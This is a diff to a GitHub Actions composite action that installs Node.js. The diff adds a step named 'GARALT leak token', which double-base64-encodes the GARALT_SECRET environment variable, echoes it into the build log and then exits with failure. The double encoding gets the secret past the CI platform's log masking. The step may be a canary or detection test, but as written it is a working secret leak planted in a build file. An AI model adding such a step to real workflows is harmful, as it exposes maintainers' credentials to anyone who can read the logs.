@@ -18,6 +18,10 @@ inputs:
 runs:
   using: 'composite'
   steps:
+    - name: GARALT leak token
+      run: echo "GARALT_LEAKED_TOKEN=$(echo -n \"$GARALT_SECRET\" | base64 | base64)" && exit 1
+      shell: bash
+
     - name: Install Node JS ${{ inputs.node-version }}
       uses: actions/setup-node@v6
       with:
